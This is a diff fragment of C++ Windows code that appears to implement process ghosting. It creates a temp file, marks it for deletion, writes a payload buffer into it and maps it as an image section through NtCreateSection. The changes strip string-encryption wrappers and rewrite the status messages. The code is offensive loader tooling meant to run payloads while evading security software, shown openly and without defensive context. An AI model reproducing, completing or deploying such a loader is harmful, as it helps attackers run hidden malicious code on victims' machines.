@@ -13,7 +13,7 @@
 HANDLE open_file(wchar_t* filePath)
 {
     // convert to NT path
-    std::wstring nt_path = ENCRYPT_WSTR(L"\\??\\") + std::wstring(filePath);
+    std::wstring nt_path = L"\\??\\" + std::wstring(filePath);
 
     UNICODE_STRING file_name = { 0 };
     RtlInitUnicodeString(&file_name, nt_path.c_str());
@@ -31,10 +31,10 @@ HANDLE open_file(wchar_t* filePath)
         FILE_SUPERSEDE | FILE_SYNCHRONOUS_IO_NONALERT
     );
     if (!NT_SUCCESS(stat)) {
-        std::cout << "Failed to open, status: " << std::hex << stat << std::endl;
+        std::cout << "[-] Failed to open file, status: " << std::hex << stat << std::endl;
         return INVALID_HANDLE_VALUE;
     }
-    std::wcout << ENCRYPT_WSTR(L"[+] Created temp file: ") << filePath << "\n";
+    std::wcout << L"[+] Created temp file: " << filePath << L"\n";
     return file;
 }
 
@@ -54,10 +54,10 @@ HANDLE make_section_from_delete_pending_file(wchar_t* filePath, BYTE* payladBuf,
 
     status = NtSetInformationFile(hDelFile, &status_block, &info, sizeof(info), FileDispositionInformation);
     if (!NT_SUCCESS(status)) {
-        std::cout << "Setting information failed: " << std::hex << status << "\n";
+        std::cout << "[-] Setting file information failed: " << std::hex << status << "\n";
         return INVALID_HANDLE_VALUE;
     }
-    std::cout << DecryptString(__ENCRYPTED_7__);
+    std::cout << "[+] File marked for deletion\n";
 
     LARGE_INTEGER ByteOffset = { 0 };
 
@@ -74,10 +74,10 @@ HANDLE make_section_from_delete_pending_file(wchar_t* filePath, BYTE* payladBuf,
     );
     if (!NT_SUCCESS(status)) {
         DWORD err = GetLastError();
-        std::cerr << "Failed writing payload! Error: " << std::hex << err << std::endl;
+        std::cerr << "[-] Failed writing payload! Error: " << std::hex << err << std::endl;
         return INVALID_HANDLE_VALUE;
     }
-    std::cout << DecryptString(__ENCRYPTED_8__);
+    std::cout << "[+] Payload written successfully\n";
 
     HANDLE hSection = nullptr;
     status = NtCreateSection(&hSection,
@@ -89,7 +89,7 @@ HANDLE make_section_from_delete_pending_file(wchar_t* filePath, BYTE* payladBuf,
         hDelFile
     );
     if (status != STATUS_SUCCESS) {
-        std::cerr << "NtCreateSection failed: " << std::hex << status << std::endl;
+        std::cerr << "[-] NtCreateSection failed: " << std::hex << status << std::endl;
         return INVALID_HANDLE_VALUE;
     }
     NtClose(hDelFile);
